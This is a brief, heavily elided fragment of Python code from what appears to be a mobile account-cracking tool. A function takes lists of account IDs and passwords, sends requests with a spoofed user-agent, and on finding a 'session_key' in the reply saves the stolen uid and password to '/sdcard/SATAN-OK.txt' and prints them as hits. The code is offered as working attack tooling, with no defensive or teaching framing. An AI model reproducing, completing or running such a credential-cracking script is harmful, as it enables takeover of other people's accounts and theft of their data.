...
def rndm(ids,passlist):
    ...
    'user-agent': stn_ua,
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SATAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SATAN-OK] '+uid+' | '+pas+'\033[1;97m')
